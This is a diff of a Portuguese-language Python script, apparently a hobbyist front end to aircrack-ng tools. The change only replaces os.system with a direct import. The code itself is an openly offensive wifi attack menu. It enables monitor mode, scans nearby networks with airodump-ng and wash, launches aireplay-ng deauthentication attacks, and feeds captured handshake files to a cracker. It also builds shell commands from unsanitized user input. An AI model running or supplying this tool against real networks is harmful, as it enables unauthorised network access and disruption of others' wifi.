@@ -2,24 +2,24 @@
 # -*- coding: utf-8 -*-
 
 import subprocess
-import os
+from os import system
 
 def Hacker_wireless():
     e = 'N'
     while e == 'N':
-        os.system('\033[32m\033[1m')
-        os.system('clear')
-        os.system('figlet PLACAS DE RDS')
-        os.system('airmon-ng')
+        system('\033[32m\033[1m')
+        system('clear')
+        system('figlet PLACAS DE RDS')
+        system('airmon-ng')
         rede = input('''\033[0;0m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 \033[34m\033[0;0m$$$$ \033[34mREDES PRA COLOCAR EM MODO MONITOR, COPIE E COLE LOGO A BAIXO\033[0;0m $$$$
 \033[0;0m$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 \033[32m\033[1mDIGITE AQUI\033[34m:\033[0;0m ''')
-        os.system('airmon-ng start {}'.format(rede))
-        os.system('\033[32m\033[1m')
-        os.system('clear')
-        os.system('figlet SCANNER - RDS')
-        os.system('airmon-ng')
+        system('airmon-ng start {}'.format(rede))
+        system('\033[32m\033[1m')
+        system('clear')
+        system('figlet SCANNER - RDS')
+        system('airmon-ng')
         print('''¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
 OBSERVE QUE A INTERFACE DE REDE ACIMA MUDOU OK, SE SIM PROSSIGA COM SCANNER!
 ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨''')
@@ -30,9 +30,9 @@ OBSERVE QUE A INTERFACE DE REDE ACIMA MUDOU OK, SE SIM PROSSIGA COM SCANNER!
 \033[34mAGORA DIGITE UMA OPÇÃO DE SCANNER\033[0;0m: '''))
         if at == 1:
             print('##################### SCANEANDO REDES WIFI PROCIMAS, PARA PARAR ctrl + c ########################')
-            os.system('airodump-ng {}'.format(rede2))
+            system('airodump-ng {}'.format(rede2))
         else:
-            os.system('wash -i {}'.format(rede2))
+            system('wash -i {}'.format(rede2))
         cmd = ['xterm']
         w = 'airodump-ng'
         m = 'wlan0mon'
@@ -47,9 +47,9 @@ OBSERVE QUE A INTERFACE DE REDE ACIMA MUDOU OK, SE SIM PROSSIGA COM SCANNER!
         v4 = '--channel'
         v6 = '--bssid'
         v9 = '--ignore-negative-one'
-        os.system('\033[32m\033[1m')
-        os.system('clear')
-        os.system('figlet ATAQUES - RDS')
+        system('\033[32m\033[1m')
+        system('clear')
+        system('figlet ATAQUES - RDS')
         at = int(input('''\033[0;0m===============================================================================
 ==================== \033[36mESCOLHA UM ATAQUE DAS OPÇÕES ABAIXO\033[0;0m ======================
 ===============================================================================
@@ -77,9 +77,9 @@ OBSERVE QUE A INTERFACE DE REDE ACIMA MUDOU OK, SE SIM PROSSIGA COM SCANNER!
             subprocess.Popen(cmd, stdout=subprocess.PIPE)
             r = 'S'
             while r == 'S':
-                os.system('\033[32m\033[1m')
-                os.system('clear')
-                os.system('figlet DESALTENTICAR')
+                system('\033[32m\033[1m')
+                system('clear')
+                system('figlet DESALTENTICAR')
                 kw = int(input('''\033[0;0m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 (\033[32m\033[1m1\033[0;0m) Aireplay-ng desaltenticador de rede!
 (\033[32m\033[1m2\033[0;0m) Se você ja capiturou o handshake!
@@ -99,11 +99,11 @@ DEPOIS REPITA NOVAMENTE 1 OK DIGITE AQUI: '''))
                     r = input('\n\033[33mQuer Desaltenticar as Redes Novamente \033[34m[S\033[0;0m] ou [\033[34mN\033[0;0m] \n\033[33mSe você já capturou o handshake:\033[0;0m').upper()
                     t0 = '-='
                     print(t0*37)
-                    os.system('ls')
+                    system('ls')
                     ar = str(input('\033[33mDigite o nome do aquivo .cap: EX, \033[34mrede-01.cap\033[0;0m! Digite o nome correto:\033[0;0m '))
                     cmd = ['xterm']
                     cmd.extend(['-e', 'bash', '-c', '{} {} {} {} {}; exec $SHELL'.format(wj, ar, w0, f1, rede2)])
                     subprocess.Popen(cmd, stdout=subprocess.PIPE)
         e = input(('Deseja encerrar a sessão S para sim / e N para não encerra a seção: ')).upper()
-    os.system('clesr')
+    system('clesr')
     print('\n############################ FIM DA SEÇÃO ################################\n')
